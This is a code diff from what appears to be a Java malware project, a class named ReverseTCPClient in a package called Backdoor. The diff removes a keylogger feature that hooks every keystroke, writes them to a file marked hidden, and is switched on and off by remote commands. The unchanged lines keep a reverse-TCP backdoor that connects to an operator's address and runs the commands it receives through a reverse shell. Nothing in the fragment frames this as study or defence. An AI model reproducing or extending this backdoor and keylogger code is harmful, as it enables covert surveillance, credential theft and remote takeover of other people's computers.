@@ -1,16 +1,11 @@
 package com.company.Backdoor.ReverseTCP;
 
 import com.company.Backdoor.BackdoorConstants;
-import com.company.KeyloggerWindows.FileOperation;
-import com.company.KeyloggerWindows.Keyboard;
-import lc.kra.system.keyboard.GlobalKeyboardHook;
+
 
 import java.io.*;
 import java.net.Socket;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.nio.file.attribute.DosFileAttributes;
+
 
 public class ReverseTCPClient
 {
@@ -20,10 +15,6 @@ public class ReverseTCPClient
     private DataInputStream dis;
     private PrintWriter writer;
     private BufferedReader reader;
-
-
-
-    private Thread keylogger;
 
     public ReverseTCPClient(String ip, int port)
     {
@@ -75,50 +66,6 @@ public class ReverseTCPClient
         return Runtime.getRuntime();
     }
 
-    private void stopKeylogger()
-    {
-
-        Keyboard.run = false;
-
-    }
-
-    private void startKeylogger()
-    {
-      keylogger = new Thread(new Runnable() {
-            @Override
-            public void run() {
-                GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
-
-                try {
-                    Keyboard.run = true;
-                    new File(Keyboard.WINDOWS_FILE_PATH).createNewFile();
-                    Path p = Paths.get(Keyboard.WINDOWS_FILE_PATH);
-                    DosFileAttributes dos = Files.readAttributes(p, DosFileAttributes.class);
-                    Files.setAttribute(p, "dos:hidden", true);
-                    Keyboard keyboard = new Keyboard(new FileOperation(),Keyboard.WINDOWS_FILE_PATH);
-                    keyboardHook.addKeyListener(keyboard);
-
-                    while(Keyboard.run)
-                    {
-                        if (keylogger.isAlive())
-                            keylogger.sleep(128);
-                    }
-                    keylogger.stop();
-
-                }
-                catch (IOException | InterruptedException e)
-                {
-                    e.printStackTrace();
-                } finally {
-                    keyboardHook.shutdownHook();
-                }
-            }
-        });
-      keylogger.start();
-
-
-    }
-
 
     public void run()
     {
@@ -133,10 +80,6 @@ public class ReverseTCPClient
 
                 if (command.equals("exit"))
                     break;
-                if (command.equals("start_keylogger"))
-                    startKeylogger();
-                if (command.equals("stop_keylogger"))
-                    stopKeylogger();
                 else
                 {
                     String response = reverseShell(command,process);
